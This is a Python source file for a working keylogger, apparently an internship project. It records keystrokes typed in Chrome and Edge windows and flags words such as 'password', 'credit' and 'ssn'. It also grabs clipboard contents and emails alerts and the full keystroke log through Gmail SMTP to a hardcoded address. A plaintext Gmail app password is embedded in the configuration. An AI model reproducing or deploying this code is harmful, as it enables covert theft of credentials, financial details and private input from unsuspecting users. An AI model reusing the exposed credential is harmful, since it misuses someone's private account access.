# Libraries
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from cryptography.fernet import Fernet
import pyclip
from pynput.keyboard import Key, Listener
import os
import pygetwindow as gw
import time

# Configuration
keys_information = "key_logs.encrypted"
decrypted_information = "key_logs.txt"
encryption_key_file = "encryption.key"
email_address = "harshithsamudrala@gmail.com"
password = "vvvm ejpl rhib wkaa"
to_email_address = "harshithsamudrala@gmail.com"
file_path = "D:\\Cyber\\Infotact Internship\\Projret1\\.venv"
extend = "\\"
apps_list = ['chrome', 'edge']  # Add the applications you want to monitor

# Paths
encrypted_log_file = os.path.join(file_path, keys_information)
decrypted_log_file = os.path.join(file_path, decrypted_information)
key_file_path = os.path.join(file_path, encryption_key_file)

# Ensure the directory exists
if not os.path.exists(file_path):
    os.makedirs(file_path)


# Encryption Key Management
def generate_key():
    if not os.path.exists(key_file_path):
        key = Fernet.generate_key()
        with open(key_file_path, 'wb') as key_file:
            key_file.write(key)


def load_key():
    with open(key_file_path, 'rb') as key_file:
        return key_file.read()


# Encrypt and Decrypt Data
def encrypt_data(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())


def decrypt_data(data, key):
    fernet = Fernet(key)
    return fernet.decrypt(data).decode()


# Encrypt Log File
def encrypt_log_file(decrypted_file, encrypted_file, key):
    with open(decrypted_file, 'r') as df, open(encrypted_file, 'wb') as ef:
        for line in df:
            encrypted_line = encrypt_data(line.strip(), key)
            ef.write(encrypted_line + b"\n")


# Decrypt Log File
def decrypt_log_file(encrypted_file, decrypted_file, key):
    try:
        with open(encrypted_file, 'rb') as ef, open(decrypted_file, 'w') as df:
            for line in ef:
                decrypted_line = decrypt_data(line.strip(), key)
                df.write(decrypted_line + "\n")
    except Exception as e:
        print(f"Error decrypting log file: {e}")


# Send email function
def send_email(subject, body, filename=None, attachment_path=None):
    try:
        from_address = email_address
        msg = MIMEMultipart()
        msg['From'] = from_address
        msg['To'] = to_email_address
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if filename and attachment_path:
            with open(attachment_path, 'rb') as attachment:
                p = MIMEBase('application', 'octet-stream')
                p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', f'attachment; filename={filename}')
                msg.attach(p)

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(from_address, password)
        s.sendmail(from_address, to_email_address, msg.as_string())
        s.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")


# Keylogger logic
predefined_words = [
    "password", "pass", "pwd", "login", "user", "username", "cmd", "shell",
    "bash", "powershell", "execute", "run", "ip", "port", "shh", "ftp",
    "http", "https", "vpn", "credit", "card", "bank", "account", "balance",
    "transfer", "ssn", "address", "phone", "dob", "email", "passport",
    "key", "token", "encryption", "decrypt", "certificate", "malware",
    "virus", "worm", "trojan", "ransomware", "exploit", "secret",
    "confidential", "classified", "restricted", "invoice", "bill", "urgent",
    "alert", "verification", "hack", "root", "admin", "backdoor", "payload"
]
special_characters = [
    '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/',
    ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~',
    '+', '-', '*', '/', '=', '%', '<', '>', '^', '|', '&', '~'  # Mathematical Symbols
]

keys = []
temp = ""


def copy_clipboard():
    try:
        pasted_data = pyclip.paste().decode('utf-8')
        send_email("Clipboard Alert", "Cut/Copy/Paste operation detected. Clipboard Data: " + pasted_data)
    except:
        send_email("Clipboard Alert", "Clipboard could not be copied")


def get_focused_window():
    try:
        window = gw.getActiveWindow()
        return window.title if window else ""
    except Exception as e:
        print(f"Error getting focused window: {e}")
        return ""


def is_monitored_app_running():
    focused_window_title = get_focused_window().lower()
    if focused_window_title:
        for w in apps_list:
            if w in focused_window_title:
                return True
    return False


def on_press(key):
    if is_monitored_app_running():  # Check if the specified application is running
        global keys
        keys.append(key)
        write_file(keys)
        keys = []


def write_file(keys):
    global temp
    with open(decrypted_log_file, 'a') as f:
        for key_press in keys:
            k = str(key_press).replace("'", "")
            if k.find("space") > 0 or k.find("enter") > 0:
                f.write("\n")
                if check_word_in_predefined_words(temp):
                    send_email("ALERT! Keyword Detected", f"The keyword was detected in the keystrokes - {temp}")
                temp = ""
            elif k.find("Key") == -1:
                f.write(k)
                if k in special_characters:
                    send_email("Alert! Special Character Detected", f"The special character is: {k}")
                temp += k


def check_word_in_predefined_words(word):
    return word.lower() in predefined_words


def on_release(key):
    if key == Key.esc:  # Stop the listener on Esc key
        print("Stopping listener and sending logs...")
        if os.path.exists(decrypted_log_file):
            send_email("Log File", "You got the log text file with recorded keywords", decrypted_information,
                       decrypted_log_file)
        key = load_key()
        encrypt_log_file(decrypted_log_file, encrypted_log_file, key)
        return False


# Main program
if __name__ == "__main__":
    print("Keylogger with encrypted storage running... Press Esc to stop.")
    generate_key()
    key = load_key()
    if os.path.exists(encrypted_log_file):
        decrypt_log_file(encrypted_log_file, decrypted_log_file, key)
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger interrupted manually.")
        key = load_key()
        if os.path.exists(encrypted_log_file):
            decrypt_log_file(encrypted_log_file, decrypted_log_file, key)
        if os.path.exists(decrypted_log_file):
            print("Sending collected logs before exiting...")
            send_email("Log File", "You got the log text file with recorded keywords", decrypted_information,
                       decrypted_log_file)
            encrypt_log_file(decrypted_log_file, encrypted_log_file, key)
        sys.exit(0)
    except Exception as e:
        print(f"An error occurred: {e}")
